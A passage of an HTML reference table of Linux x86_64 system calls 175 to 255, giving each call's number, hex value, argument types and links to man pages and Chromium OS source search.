href="https://man7.org/linux/man-pages/man2/init_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*init_module">cs/</a></td><td align="center">0xaf</td><td>void *umod</td><td>unsigned long len</td><td>const char *uargs</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">176</td><td>delete_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/delete_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*delete_module">cs/</a></td><td align="center">0xb0</td><td>const char *name_user</td><td>unsigned int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">177</td><td>get_kernel_syms</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_kernel_syms.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_kernel_syms">cs/</a></td><td align="center">0xb1</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">178</td><td>query_module</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/query_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*query_module">cs/</a></td><td align="center">0xb2</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">179</td><td>quotactl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/quotactl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*quotactl">cs/</a></td><td align="center">0xb3</td><td>unsigned int cmd</td><td>const char *special</td><td>qid_t id</td><td>void *addr</td><td>-</td><td>-</td></tr><tr><td align="center">180</td><td>nfsservctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nfsservctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nfsservctl">cs/</a></td><td align="center">0xb4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">181</td><td>getpmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpmsg">cs/</a></td><td align="center">0xb5</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">182</td><td>putpmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/putpmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*putpmsg">cs/</a></td><td align="center">0xb6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">183</td><td>afs_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/afs_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*afs_syscall">cs/</a></td><td align="center">0xb7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">184</td><td>tuxcall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tuxcall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tuxcall">cs/</a></td><td align="center">0xb8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">185</td><td>security</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/security.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*security">cs/</a></td><td align="center">0xb9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">186</td><td>gettid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettid">cs/</a></td><td align="center">0xba</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">187</td><td>readahead</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readahead.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readahead">cs/</a></td><td align="center">0xbb</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">188</td><td>setxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setxattr">cs/</a></td><td align="center">0xbc</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">189</td><td>lsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lsetxattr">cs/</a></td><td align="center">0xbd</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">190</td><td>fsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsetxattr">cs/</a></td><td align="center">0xbe</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">191</td><td>getxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getxattr">cs/</a></td><td align="center">0xbf</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">192</td><td>lgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lgetxattr">cs/</a></td><td align="center">0xc0</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">193</td><td>fgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fgetxattr">cs/</a></td><td align="center">0xc1</td><td>int fd</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">194</td><td>listxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listxattr">cs/</a></td><td align="center">0xc2</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">195</td><td>llistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/llistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*llistxattr">cs/</a></td><td align="center">0xc3</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">196</td><td>flistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flistxattr">cs/</a></td><td align="center">0xc4</td><td>int fd</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">197</td><td>removexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/removexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*removexattr">cs/</a></td><td align="center">0xc5</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">198</td><td>lremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lremovexattr">cs/</a></td><td align="center">0xc6</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">199</td><td>fremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fremovexattr">cs/</a></td><td align="center">0xc7</td><td>int fd</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">200</td><td>tkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tkill">cs/</a></td><td align="center">0xc8</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">201</td><td>time</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/time.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*time">cs/</a></td><td align="center">0xc9</td><td>time_t *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">202</td><td>futex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex">cs/</a></td><td align="center">0xca</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct __kernel_timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td align="center">203</td><td>sched_setaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setaffinity">cs/</a></td><td align="center">0xcb</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">204</td><td>sched_getaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getaffinity">cs/</a></td><td align="center">0xcc</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">205</td><td>set_thread_area</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_thread_area.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_thread_area">cs/</a></td><td align="center">0xcd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">206</td><td>io_setup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_setup">cs/</a></td><td align="center">0xce</td><td>unsigned nr_reqs</td><td>aio_context_t *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">207</td><td>io_destroy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_destroy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_destroy">cs/</a></td><td align="center">0xcf</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">208</td><td>io_getevents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_getevents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_getevents">cs/</a></td><td align="center">0xd0</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">209</td><td>io_submit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_submit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_submit">cs/</a></td><td align="center">0xd1</td><td>aio_context_t</td><td>long</td><td>struct iocb * *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">210</td><td>io_cancel</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_cancel.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_cancel">cs/</a></td><td align="center">0xd2</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">211</td><td>get_thread_area</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_thread_area.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_thread_area">cs/</a></td><td align="center">0xd3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">212</td><td>lookup_dcookie</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lookup_dcookie.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lookup_dcookie">cs/</a></td><td align="center">0xd4</td><td>u64 cookie64</td><td>char *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">213</td><td>epoll_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create">cs/</a></td><td align="center">0xd5</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">214</td><td>epoll_ctl_old</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl_old.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl_old">cs/</a></td><td align="center">0xd6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">215</td><td>epoll_wait_old</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_wait_old.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_wait_old">cs/</a></td><td align="center">0xd7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">216</td><td>remap_file_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/remap_file_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*remap_file_pages">cs/</a></td><td align="center">0xd8</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">217</td><td>getdents64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents64">cs/</a></td><td align="center">0xd9</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">218</td><td>set_tid_address</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_tid_address.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_tid_address">cs/</a></td><td align="center">0xda</td><td>int *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">219</td><td>restart_syscall</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/restart_syscall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*restart_syscall">cs/</a></td><td align="center">0xdb</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">220</td><td>semtimedop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semtimedop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semtimedop">cs/</a></td><td align="center">0xdc</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>const struct __kernel_timespec *timeout</td><td>-</td><td>-</td></tr><tr><td align="center">221</td><td>fadvise64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fadvise64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fadvise64">cs/</a></td><td align="center">0xdd</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>-</td></tr><tr><td align="center">222</td><td>timer_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_create">cs/</a></td><td align="center">0xde</td><td>clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t * created_timer_id</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">223</td><td>timer_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime">cs/</a></td><td align="center">0xdf</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec *new_setting</td><td>struct __kernel_itimerspec *old_setting</td><td>-</td><td>-</td></tr><tr><td align="center">224</td><td>timer_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime">cs/</a></td><td align="center">0xe0</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec *setting</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">225</td><td>timer_getoverrun</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_getoverrun.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_getoverrun">cs/</a></td><td align="center">0xe1</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">226</td><td>timer_delete</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_delete.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_delete">cs/</a></td><td align="center">0xe2</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">227</td><td>clock_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime">cs/</a></td><td align="center">0xe3</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">228</td><td>clock_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime">cs/</a></td><td align="center">0xe4</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">229</td><td>clock_getres</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres">cs/</a></td><td align="center">0xe5</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">230</td><td>clock_nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep">cs/</a></td><td align="center">0xe6</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td></tr><tr><td align="center">231</td><td>exit_group</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit_group.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit_group">cs/</a></td><td align="center">0xe7</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">232</td><td>epoll_wait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_wait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_wait">cs/</a></td><td align="center">0xe8</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>-</td><td>-</td></tr><tr><td align="center">233</td><td>epoll_ctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl">cs/</a></td><td align="center">0xe9</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td>-</td><td>-</td></tr><tr><td align="center">234</td><td>tgkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tgkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tgkill">cs/</a></td><td align="center">0xea</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">235</td><td>utimes</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimes.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimes">cs/</a></td><td align="center">0xeb</td><td>char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">236</td><td>vserver</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vserver.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vserver">cs/</a></td><td align="center">0xec</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">237</td><td>mbind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mbind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mbind">cs/</a></td><td align="center">0xed</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td align="center">238</td><td>set_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_mempolicy">cs/</a></td><td align="center">0xee</td><td>int mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">239</td><td>get_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_mempolicy">cs/</a></td><td align="center">0xef</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">240</td><td>mq_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_open">cs/</a></td><td align="center">0xf0</td><td>const char *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr *attr</td><td>-</td><td>-</td></tr><tr><td align="center">241</td><td>mq_unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_unlink">cs/</a></td><td align="center">0xf1</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">242</td><td>mq_timedsend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend">cs/</a></td><td align="center">0xf2</td><td>mqd_t mqdes</td><td>const char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">243</td><td>mq_timedreceive</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive">cs/</a></td><td align="center">0xf3</td><td>mqd_t mqdes</td><td>char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int *msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">244</td><td>mq_notify</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_notify.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_notify">cs/</a></td><td align="center">0xf4</td><td>mqd_t mqdes</td><td>const struct sigevent *notification</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">245</td><td>mq_getsetattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_getsetattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_getsetattr">cs/</a></td><td align="center">0xf5</td><td>mqd_t mqdes</td><td>const struct mq_attr *mqstat</td><td>struct mq_attr *omqstat</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">246</td><td>kexec_load</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_load">cs/</a></td><td align="center">0xf6</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td>-</td><td>-</td></tr><tr><td align="center">247</td><td>waitid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/waitid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitid">cs/</a></td><td align="center">0xf7</td><td>int which</td><td>pid_t pid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td>-</td></tr><tr><td align="center">248</td><td>add_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/add_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*add_key">cs/</a></td><td align="center">0xf8</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td></tr><tr><td align="center">249</td><td>request_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/request_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*request_key">cs/</a></td><td align="center">0xf9</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td></tr><tr><td align="center">250</td><td>keyctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/keyctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*keyctl">cs/</a></td><td align="center">0xfa</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">251</td><td>ioprio_set</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_set.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_set">cs/</a></td><td align="center">0xfb</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">252</td><td>ioprio_get</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_get.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_get">cs/</a></td><td align="center">0xfc</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">253</td><td>inotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init">cs/</a></td><td align="center">0xfd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">254</td><td>inotify_add_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_add_watch">cs/</a></td><td align="center">0xfe</td><td>int fd</td><td>const char *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">255</td><td>inotify_rm_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_rm_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_rm_watch">cs/</a></td><td align="center">0xff</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">256</td><td>migrate_pages</td><td align="center"><a 